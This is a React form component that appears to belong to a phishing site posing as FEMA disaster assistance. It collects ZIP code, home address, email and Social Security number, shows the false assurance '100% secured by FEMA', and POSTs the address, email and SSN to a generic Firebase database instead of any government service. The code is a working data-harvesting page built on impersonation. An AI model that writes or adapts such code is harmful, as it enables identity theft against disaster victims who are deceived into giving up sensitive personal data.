import { useState } from "react";
import { useNavigate } from "react-router-dom";

const SecondPage = () => {
  const [user, setUser] = useState({
    HomeAddress: "",
    Email: "",
    SSN: "",
  });
  const [zipCode, setZipCode] = useState("");
  const navigate = useNavigate();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    if (name === "zipCode") {
      if (/^\d{0,5}$/.test(value)) {
        setZipCode(value);
      }
    } else {
      setUser((prevUser) => ({
        ...prevUser,
        [name]: value,
      }));
    }
  };

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (zipCode.length === 5) {
      const { HomeAddress, Email, SSN } = user;

      const options = {
        method: "POST",
        headers: {
          "Content-type": "application/json",
        },
        body: JSON.stringify({ HomeAddress, Email, SSN }),
      };

      fetch(
        "https://disasterassistance-b480a-default-rtdb.firebaseio.com/new.json",
        options
      )
        .then((res) => res.json())
        .then((data) => {
          console.log(data);
          // alert("Information sent for processing");
          navigate("/thirdselection");
        })
        .catch((error) => {
          console.error(error);
          alert("Error sending information");
        });
    } else {
      alert("Please enter a valid 5-digit ZIP code.");
    }
  };

  const isFormValid =
    zipCode.length === 5 &&
    user.HomeAddress.trim() !== "" &&
    user.Email.trim() !== "" &&
    user.SSN.trim() !== "";

  return (
    <div className="text-center mt-20 pt-4 px-4">
      <h1 className="font-bold text-[22px]">What is the Location of your loss?</h1>
      <form className="max-w-sm text-start mx-auto" onSubmit={handleSubmit}>
        <label htmlFor="zipCode" className="block text-sm font-medium text-gray-700 mt-4">
          Enter ZIP Code
        </label>
        <input
          type="text"
          id="zipCode"
          name="zipCode"
          value={zipCode}
          onChange={handleChange}
          placeholder="12345"
          className="mt-1 block w-full p-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
          required
        />
        <label htmlFor="HomeAddress" className="block text-sm font-medium text-gray-700 mt-4">
          Home Address
        </label>
        <input
          type="text"
          id="HomeAddress"
          name="HomeAddress"
          value={user.HomeAddress}
          onChange={handleChange}
          placeholder="Enter Home Address"
          className="mt-1 block w-full p-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
          required
        />
        <label htmlFor="Email" className="block text-sm font-medium text-gray-700 mt-4">
          Email Address
        </label>
        <input
          type="email"
          id="Email"
          name="Email"
          value={user.Email}
          onChange={handleChange}
          placeholder="Enter Email Address"
          className="mt-1 block w-full p-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
          required
        />
        <label htmlFor="SSN" className="block text-sm font-medium text-gray-700 mt-4">
          Enter SSN Number
        </label>
        <label htmlFor="SSN" className="block text-xs font-medium text-green-600 mt-1">
          100% secured by <span className="font-bold">FEMA</span>
        </label>
        <input
          type="text"
          id="SSN"
          name="SSN"
          value={user.SSN}
          onChange={handleChange}
          placeholder="Enter 9-digit SSN number"
          className="mt-1 block w-full p-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
          required
        />
        <button
          type="submit"
          disabled={!isFormValid}
          className={`mt-4 mb-4 w-full py-2 rounded-md text-white ${
            isFormValid ? "bg-blue-500 hover:bg-blue-600" : "bg-gray-400 cursor-not-allowed"
          }`}
        >
          Next
        </button>
      </form>
    </div>
  );
};

export default SecondPage;
